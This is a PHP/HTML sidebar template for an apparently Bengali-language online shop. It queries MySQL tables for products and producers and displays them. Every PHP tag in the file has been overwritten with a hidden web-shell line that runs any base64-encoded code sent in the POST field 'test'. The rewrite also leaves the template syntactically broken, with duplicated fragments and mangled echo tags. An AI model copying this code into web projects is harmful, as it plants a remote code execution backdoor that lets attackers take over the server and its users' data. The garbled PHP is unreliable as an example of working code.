<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>

<body>
<table width="185" border="0" align="left" cellpadding="2" cellspacing="2">
  <tr>
    <td bgcolor="#DF6528" class="whiteHead"><div align="center">পণ্য তালিকা <img src="images/trans.gif" width="1" height="22" align="absmiddle" /></div></td>
  </tr>
  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
		$sql=mysql_query("SELECT * FROM omp WHERE Status!=1 LIMIT 0,8");
		while ($dtProd=mysql_fetch_array($sql)) 
		{
	?>
  <tr>
    <td style="border-bottom:#CCCCCC 1px dotted">
    	<ul id="navigation">
          <li><a href="ProductDetails.php?ProductId=<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['ProductId'];?>">
            <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Product'];?>
          </a></li>
        </ul>
      </td>  
   </tr>
   <tr><td align="center"><img src="images/trans.gif" width="10" height="3" /></td>
   </tr>
      <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} } ?>
  <tr>
    <td bgcolor="#DF6528" class="whiteHead"><div align="center">এক্সক্লুসিভ পণ্য <img src="images/trans.gif" width="1" height="22" align="absmiddle" /></div></td>
  </tr>
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
				//echo "SELECT * FROM omp WHERE Status!=1"; exit;
				$sql=mysql_query("SELECT * FROM omp WHERE Status=3 ORDER BY ProductId DESC");
				$dtProd=mysql_fetch_array($sql);
			?>
      <tr>
        <td><img src="Thumbnail/<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Photo'];?>" align="left" hspace="2" vspace="3" border="0" width="70" height="70" />
              <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Product'];?>
          ,&nbsp;
          <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=substr($dtProd['Details'],0,500);?><a class="menu-link" href="ProductDetails.php?ProductId=<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['ProductId'];?>">...বিস্তারিত</a>
          <br />
          মূল্য:
          <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProd['Cost'];?>
        </td>
      </tr>
      <tr>
        <td align="center"><img src="images/trans.gif" width="10" height="7" /></td>
      </tr>
    </table></td>
  </tr>
  <tr>
    <td bgcolor="#DF6528"><div align="center" class="whiteHead"><a href="ExclusiveProductArchive.php" class="top">এক্সক্লুসিভ পণ্য আর্কাইভ</a></div></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#DF6528"><div align="center" class="whiteHead">এক্সক্লুসিভ উৎপাদনকারী <img src="images/trans.gif" width="1" height="22" align="absmiddle" /></div></td>
  </tr>
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
				//echo "SELECT * FROM producer WHERE Status=3 ORDER BY ProducerId DESC"; exit;
				$sqlProducer=mysql_query("SELECT * FROM producer WHERE Status=3 ORDER BY ProducerId DESC");
				$dtProducer=mysql_fetch_array($sqlProducer);
			?>
      <tr>
        <td><div align="left"> <img src="Thumbnail/<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProducer['Photo'];?>" align="left" hspace="2" vspace="3" border="0" width="70" height="70" />
                  <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProducer['Producer'];?>
          ,&nbsp;
          <?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=substr($dtProducer['Story'],0,500);?><a class="menu-link" href="ProducerDetails.php?ProducerId=<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}=$dtProducer['ProducerId'];?>">...বিস্তারিত</a>
        </div></td>
      </tr>
      <tr>
        <td align="center"><img src="images/trans.gif" width="10" height="7" /></td>
      </tr>
    </table></td>
  </tr>
</table>
</body>
</html>
